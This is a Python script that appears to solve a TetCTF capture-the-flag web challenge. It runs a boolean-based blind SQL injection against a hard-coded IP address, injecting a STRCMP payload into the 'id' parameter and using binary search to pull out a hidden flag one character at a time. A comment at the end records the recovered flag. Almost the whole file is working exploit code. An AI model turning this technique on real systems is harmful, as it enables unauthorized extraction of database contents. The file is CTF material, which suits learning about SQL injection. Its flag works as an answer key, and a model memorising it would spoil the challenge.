# Sorry for the ugly code, I just wanted to make it work... There are no functions and some pointless repetition
# I used binary search to speed up the proccess

import requests

payload = "id=1%26%261%2bSTRCMP(t_fl4g_v3lue_su,BINARY%200x{0})"
flag_guess = "546574435446" # 0x54 = TetCTF (we know the flag starts with this)

URL = "http://45.77.255.164/?"

hex_guess_min = 32 # 32 = space ("smallest" ASCII char we'll try)
hex_guess_max = 126 # 126 = ~ ("highest" ASCII char we'll try)

curr_guess = hex(int(hex_guess_min + (hex_guess_max-hex_guess_min)/2))[2:]

while True:
    fullURL = URL + payload.format(str(flag_guess) + str(curr_guess))
    # print("Request to " + fullURL)
    response = requests.get(fullURL)
    # print(response.text)

    if 'handsome_flag' in response.text:
        if hex_guess_min == int(curr_guess, 16): # FOUND CHAR FROM FLAG
            flag_guess += str(curr_guess)
            print("Flag until now: " + bytes.fromhex(flag_guess).decode('utf-8'))
            if bytes.fromhex(curr_guess).decode('utf-8') == '}':
                break
            hex_guess_min = 32
            hex_guess_max = 126
            curr_guess = hex(int(hex_guess_min + (hex_guess_max-hex_guess_min)/2))[2:]
        else:
            hex_guess_min = int(curr_guess, 16)
            curr_guess = hex(int(hex_guess_min + (hex_guess_max-hex_guess_min)/2))[2:]
    else:
        hex_guess_max = int(curr_guess, 16)
        curr_guess = hex(int(hex_guess_min + (hex_guess_max-hex_guess_min)/2))[2:]

print("DONE! Here's your flag: " + bytes.fromhex(flag_guess).decode('utf-8'))

# TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#}